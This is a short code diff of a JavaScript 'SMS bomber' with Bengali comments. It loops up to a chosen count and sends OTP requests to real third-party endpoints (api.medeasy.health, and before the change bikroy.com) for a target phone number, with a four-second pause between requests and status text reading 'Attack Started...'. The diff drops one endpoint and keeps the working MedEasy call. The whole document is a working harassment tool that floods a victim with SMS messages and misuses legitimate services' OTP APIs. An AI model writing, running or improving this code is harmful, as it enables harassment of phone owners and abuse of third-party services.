@@ -35,18 +35,10 @@ async function startProcess() {
 
     display.innerText = "Attack Started...";
     
-    // আপনার ফাইনাল ২ টি এপিআই লিস্ট
-    const apiList = [
-        `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${target}`,
-        `https://api.medeasy.health/api/send-otp/+88${target}/`
-    ];
-
     for (let i = 1; i <= count; i++) {
         try { 
-            // এই ২টি এপিআই থেকে পর্যায়ক্রমে এসএমএস যাবে
-            let currentApi = apiList[(i - 1) % apiList.length];
-
-            await fetch(currentApi, { 
+            // শুধুমাত্র MedEasy API ব্যবহার করা হচ্ছে
+            await fetch(`https://api.medeasy.health/api/send-otp/+88${target}/`, { 
                 method: 'GET', 
                 mode: 'no-cors',
                 cache: 'no-store'
@@ -54,7 +46,7 @@ async function startProcess() {
 
             display.innerText = "Sent: " + i;
             
-            // আপনার সেই নিরাপদ ৪ সেকেন্ডের বিরতি
+            // আপনার সেই ৪ সেকেন্ডের বিরতি
             await new Promise(res => setTimeout(res, 4000));
         } catch (e) {
             console.log("Error skipped...");
